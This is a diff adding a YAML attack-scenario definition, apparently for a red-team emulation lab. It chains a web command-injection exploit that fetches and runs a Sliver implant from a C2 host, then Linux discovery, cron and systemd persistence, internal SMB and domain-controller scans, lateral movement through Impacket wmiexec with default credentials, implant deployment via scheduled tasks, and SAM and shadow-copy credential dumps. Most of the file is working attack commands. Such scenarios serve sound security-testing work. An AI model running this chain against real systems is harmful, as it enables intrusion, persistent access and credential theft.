@@ -1,0 +1,281 @@
+name: Full Attack Scenario — Web RCE Initial Access to Windows Credential Access
+description: >
+  Complete Phase A+B. No pre-existing session is required: the chain opens by
+  exploiting the command-injection in linux_pivot's vulnweb service (initial_access)
+  to stage a Sliver beacon and obtain the first Linux session, then runs the exact
+  same post-exploitation → persistence → lateral-movement → credential-access
+  sequence as before, threaded through via session_id: "{{linux_session}}".
+tags:
+  - linux
+  - windows
+  - wmiexec
+  - lateral-movement
+  - initial-access
+  - phase-a
+  - phase-b
+mitre_tactics:
+  - initial-access
+  - discovery
+  - persistence
+  - lateral-movement
+  - execution
+  - credential-access
+
+# Named host an initial_access step can breach to obtain the first Linux session.
+# vulnweb is the REAL exploitable target on linux_pivot (GET /ping?host= command
+# injection, lab/provision/vulnweb/server.py, deployed by setup.sh on :9090) — the
+# honeypot on :8080 is cosmetic decoration and is not exploited.
+targets:
+  - name: linux_victim
+    host: 192.168.56.10
+    port: 9090
+    attrs:
+      path: /ping
+
+steps:
+  # ── Initial access: exploit vulnweb → beacon → first Linux session ───────────
+  - id: breach_linux_host
+    name: Exploit vulnweb command injection → stage Sliver beacon (T1190)
+    action:
+      type: initial_access
+      initial_access:
+        target: linux_victim
+        module: external
+        config:
+          # argv for the built-in "external" module (JSON array as a string).
+          # web_rce.py is staged onto the C2 host at /opt/exploits by
+          # lab/provision/c2-server.sh (synced from lab/exploits/web_rce.py).
+          run: '["python3", "/opt/exploits/web_rce.py"]'
+          # The implant the injected command downloads and runs on linux_pivot.
+          implant_url: "http://192.168.56.5:8080/api/v1/implant/linux?c2=192.168.56.5"
+        wait:
+          timeout: "240s"    # first fetch triggers a server-side implant build
+          match_os: "linux"  # correlate against the new session, not stale ones
+    output_var: linux_session   # <- new Sliver session UUID captured here
+    timeout: "300s"
+    on_fail: abort
+  - id: linux_sysinfo
+    name: Linux host discovery (T1082)
+    depends_on:
+      - breach_linux_host
+    session_id: "{{linux_session}}"
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1082
+        test: 2
+    output_var: linux_sysinfo_out
+    timeout: 30s
+    on_fail: continue
+  - id: linux_network
+    name: Linux network discovery (T1016)
+    depends_on:
+      - linux_sysinfo
+    session_id: "{{linux_session}}"
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1016
+        test: 2
+    output_var: linux_network_out
+    timeout: 30s
+    on_fail: continue
+  - id: cron_persistence
+    name: Cron persistence (T1053.003)
+    depends_on:
+      - linux_sysinfo
+    session_id: "{{linux_session}}"
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1053.003
+        test: 2
+    timeout: 30s
+    on_fail: continue
+  - id: systemd_persistence
+    name: Systemd persistence (T1543.002)
+    depends_on:
+      - cron_persistence
+    session_id: "{{linux_session}}"
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1543.002
+        test: 0
+    timeout: 30s
+    on_fail: continue
+  - id: find_windows_host
+    name: Scan internal net for Windows SMB port 445
+    depends_on:
+      - linux_network
+    session_id: "{{linux_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          # Dynamic Windows host discovery — arp-scan + SMB port check
+          echo "[*] Scanning internal network for Windows hosts (port 445)..."
+          # Get local subnet:
+          SUBNET=$(ip route | grep -oP '172\.16\.[0-9]+\.0/[0-9]+' | head -1)
+          if [ -z "$SUBNET" ]; then
+            SUBNET="172.16.1.0/24"
+          fi
+          echo "[*] Target subnet: $SUBNET"
+          # Scan with nmap for SMB port 445:
+          FOUND=""
+          if command -v nmap &>/dev/null; then
+            FOUND=$(nmap -p 445 --open -T4 "$SUBNET" 2>/dev/null | grep "Nmap scan report" | grep -oP '[\d.]+' | while read ip; do
+              timeout 1 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && echo "$ip" && break
+            done)
+          fi
+          # Fallback — arp-scan:
+          if [ -z "$FOUND" ] && command -v arp-scan &>/dev/null; then
+            FOUND=$(arp-scan "$SUBNET" 2>/dev/null | grep -oP '172\.16\.[0-9]+\.[0-9]+' | while read ip; do
+              timeout 1 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && echo "$ip" && break
+            done)
+          fi
+          # Final fallback — tcp sweep:
+          if [ -z "$FOUND" ]; then
+            for i in $(seq 1 254); do
+              ip="172.16.1.$i"
+              timeout 0.5 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && FOUND="$ip" && break
+            done
+          fi
+          if [ -n "$FOUND" ]; then
+            echo "WINDOWS_HOST_FOUND: $FOUND"
+          else
+            echo "NO_WINDOWS_HOST_FOUND"
+          fi
+    output_var: windows_host_out
+    output_extract:
+      - var: win_ip
+        regex: 'WINDOWS_HOST_FOUND: ([0-9.]+)'
+        group: 1
+    timeout: 15s
+    on_fail: continue
+  - id: lateral_recon
+    name: Lateral movement — wmiexec hostname (T1021)
+    depends_on:
+      - find_windows_host
+    session_id: "{{linux_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          WIN_IP="{{win_ip}}"
+          if [ -z "$WIN_IP" ]; then WIN_IP="172.16.1.20"; fi
+          echo "[*] LATERAL MOVEMENT INITIATED"
+          echo "[*] Attack vector: Impacket WMIExec (T1021.006)"
+          echo "[*] Source: linux_pivot ($(hostname))"
+          echo "[*] Target: $WIN_IP (Windows SMB/WMI)"
+          echo "[*] Credentials: vagrant:vagrant (T1078 - Valid Accounts)"
+          echo "---"
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            "vagrant:vagrant@$WIN_IP" hostname 2>&1 \
+            | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -5
+          echo "---"
+          echo "[+] LATERAL_MOVEMENT_SUCCESS: Achieved code execution on Windows host via WMI"
+    output_var: win_hostname
+    timeout: 120s
+    on_fail: continue
+  - id: win_sysinfo
+    name: Windows sysinfo via wmiexec (T1082)
+    depends_on:
+      - lateral_recon
+    session_id: "{{linux_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            'vagrant:vagrant@172.16.1.20' "hostname" 2>&1 \
+            | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -2
+    output_var: win_sysinfo_out
+    timeout: 120s
+    on_fail: continue
+  - id: deploy_implant
+    name: Deploy Windows implant via wmiexec (scheduled task trigger)
+    depends_on:
+      - lateral_recon
+    session_id: "{{linux_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          # Trigger existing WindowsUpdateHelper scheduled task (already installed, fast)
+          # Kill existing implants first (prevent duplicates):
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            'vagrant:vagrant@172.16.1.20' \
+            "taskkill /f /im svc*.exe /t" \
+            2>&1 | tail -1 || true
+          # Deploy fresh implant:
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            'vagrant:vagrant@172.16.1.20' \
+            "schtasks /run /tn WindowsUpdateHelper" \
+            2>&1 | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
+    output_var: implant_out
+    timeout: 90s
+    on_fail: continue
+  - id: sam_dump
+    name: SAM registry dump via wmiexec (T1003.002)
+    depends_on:
+      - lateral_recon
+    session_id: "{{linux_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          # Trigger SAMDump scheduled task (fast, <2s, non-blocking):
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            'vagrant:vagrant@172.16.1.20' \
+            "schtasks /run /tn SAMDump" \
+            2>&1 | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
+          echo "SAM_DUMP_TRIGGERED"
+    output_var: sam_dump_out
+    timeout: 120s
+    on_fail: continue_no_err
+  - id: find_dc_candidate
+    name: Scan for AD/DC host — Kerberos(88) LDAP(389) SMB(445) (T1046)
+    depends_on:
+      - deploy_implant
+    session_id: "{{linux_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          echo "=== Scanning for DC candidate ==="
+          for ip in 172.16.1.1 172.16.1.5 172.16.1.20 172.16.1.100; do
+            for port in 88 389 445 3268; do
+              timeout 1 bash -c "echo > /dev/tcp/$ip/$port" 2>/dev/null \
+                && echo "DC_CANDIDATE: $ip port:$port OPEN"
+            done
+          done
+          exit 0
+    output_var: dc_scan_out
+    timeout: 30s
+    on_fail: continue_no_err
+  - id: shadow_copy_vss
+    name: VSS shadow copy creation — credential access POC (T1003.003)
+    depends_on:
+      - find_dc_candidate
+    session_id: "{{linux_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          # Trigger VSSDump scheduled task (fast, non-blocking, no timeout):
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            'vagrant:vagrant@172.16.1.20' \
+            "schtasks /run /tn VSSDump" \
+            2>&1 | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
+          echo "VSS_POC_COMPLETE"
+    output_var: vss_out
+    timeout: 60s
+    on_fail: continue_no_err
